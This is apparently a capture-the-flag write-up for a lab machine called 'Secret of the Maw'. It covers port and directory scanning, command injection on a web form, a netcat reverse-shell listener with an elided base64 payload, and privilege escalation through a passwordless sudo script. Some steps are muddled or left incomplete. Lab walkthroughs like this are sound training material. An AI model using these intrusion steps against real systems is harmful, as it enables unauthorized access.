# CTF: Secret of the Maw

![Difficulty: Easy](https://img.shields.io/badge/difficulty-easy-%2300ff00)
![Contest Date: 2024-05-14](https://img.shields.io/badge/contest%20date-2024--05--14-informational)
![Category: FTP](https://img.shields.io/badge/category-ftp-%237159c1)
![By: Alexandre & Eloi](https://img.shields.io/badge/by-Alexandre%20%26%20Eloi-%23f9a03c)
![alt text](img/secretofthemaw.png)

## Description

> Uncover the secrets of the maw, and don't get caught!

## Write-up

The flag is a reference to the Harry Potter series.

UserFlag: user.txt
RootFlag: root.txt

## Flag Solutions

### User Flag

First thing to do is to check open ports on the target machine. We can do this by running a port scan using `nmap`.

```bash
nmap -sSV $IP
```

Results :

```bash
Starting Nmap 7.60 ( https://nmap.org ) at 2024-05-20 10:26 BST
Nmap scan report for ip-10-10-118-193.eu-west-1.compute.internal (10.10.118.193)
Host is up (0.0060s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 02:81:96:FF:41:9D (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.12 seconds
```

The target machine has three open ports, 22, 21 and 80. Port 21 is running an FTP server. Let's connect to the FTP server.

We go to the 80 port :

`http://$IP`

We see a website with a gif :

![alt text](img/secretofthemaw1.png)

We can use gobuster to find hidden directories :

```
gobuster dir --url http://$IP -w Tools/wordlists/dirbuster/directory-list-2.3-small.txt
```

Results :

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.118.193
[+] Threads:        10
[+] Wordlist:       Tools/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2024/05/20 10:31:03 Starting gobuster
===============================================================
/images (Status: 301)
/css (Status: 301)
/discrete (Status: 301)
Progress: 46295 / 87665 (52.81%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2024/05/20 10:31:10 Finished
===============================================================
```

We go to the `/discrete` directory :

`http://$IP/discrete`

We see a page with a gif and a input

![alt text](img/secretofthemaw2.png)

If we try to put a random input, we see nothing happens.
But if we put linux commands, we are redirected to a page saying "You weren't discrete ! Hide quickly or he's going to find you!"

We have to do a reverse shell to get the user flag.  
http://localhost:7778

We can use the following command :

**In the attacker machine :**

```
nc -lvnp 9001
```

**In the target website :**

```
echo « BASE64 » | base64 —decode
```

We do `sudo -l` to see the sudo rights of the user.

```bash
User www-data may run the following commands on the-maw:
    (six) NOPASSWD: /home/six/.musicbox
```

We can execute the `/home/six/.musicbox` file as the user
```bash
sudo -u six /home/six/.musicbox
```

We are connected to `six` user. We have the user flag in the `/home/six` directory.